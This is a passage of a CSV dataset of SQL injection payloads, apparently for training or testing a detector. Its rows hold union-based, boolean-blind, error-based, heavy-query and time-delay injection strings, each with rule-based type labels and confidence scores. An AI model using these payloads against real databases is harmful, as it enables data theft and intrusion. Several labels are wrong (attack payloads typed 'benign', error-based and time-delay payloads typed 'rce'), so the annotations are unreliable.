row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8040,"1' ) where 6720 = 6720 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
8041,"1%' ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
8042,-7663' ) ) or 1558 = 1104 and ( ( 'wsrq' = 'wsrq,1,,boolean_blind,generic,0.95,1558 = 1104 and detected — boolean_blind injection (priority 8) on generic,rule-based
8043,1 ) ) as rvex where 3462 = 3462 and 4595 = 4595#,1,,boolean_blind,generic,0.95,3462 = 3462 and detected — boolean_blind injection (priority 8) on generic,rule-based
8044,1' ) where 4500 = 4500,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8045,"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8046,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'nhrc' like 'nhrc,1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
8047,"-6357"" ) union all select 9767,9767,9767,9767,9767,9767,9767,9767,9767#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8048,1' ) where 5680 = 5680 and ( 3020 = 3020 ) *6703--,1,,boolean_blind,generic,0.95,5680 = 5680 and detected — boolean_blind injection (priority 8) on generic,rule-based
8049,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'jylk' = 'jylk",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8050,"1 ) ) as jmcp where 8624 = 8624 union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8051,"1"" or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""bkrk"" = ""bkrk",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
8052,"-8794 ) ) ) union all select 5802,5802,5802--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8053,"1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ""%"" = """,1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
8054,"1"" ) ) as nhus where 3689 = 3689",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8055,"-3228"" ) or ( 5901 = 1570 ) *1570 and ( ""egdd"" = ""egdd",1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
